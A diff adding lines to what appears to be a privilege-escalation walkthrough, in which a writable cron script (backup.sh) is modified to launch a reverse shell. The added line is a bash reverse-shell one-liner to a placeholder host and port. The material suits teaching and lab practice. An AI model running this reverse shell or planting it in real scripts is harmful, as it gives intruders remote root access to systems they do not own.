@@ -17,6 +17,8 @@ Any user can read the file keeping system-wide cron jobs under
 As our current user can access this script backup.sh , we can easily modify it to create a reverse shell, hopefully with root privileges.
 
 The script will use the tools available on the target system to launch a reverse shell .
+  
+    bash -i >& /dev/tcp/@/N_port 0>&1
 
 ![catback](https://user-images.githubusercontent.com/94765997/162630021-89e2f7a3-12e7-4fe1-811c-1bd3c50b4437.png)
 
